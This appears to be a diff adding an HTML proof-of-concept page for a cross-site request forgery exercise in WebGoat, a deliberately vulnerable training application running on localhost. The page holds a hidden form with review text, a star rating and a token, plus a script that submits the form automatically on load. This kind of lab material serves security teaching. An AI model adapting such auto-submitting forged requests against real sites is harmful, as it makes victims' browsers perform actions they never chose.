@@ -1,0 +1,12 @@
+<html>
+    <body>
+        <form action="http://localhost:8080/WebGoat/csrf/review" method="POST">
+            <input type="hidden" name="reviewText" value="test text" />
+            <input type="hidden" name="stars" value="2" />
+            <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
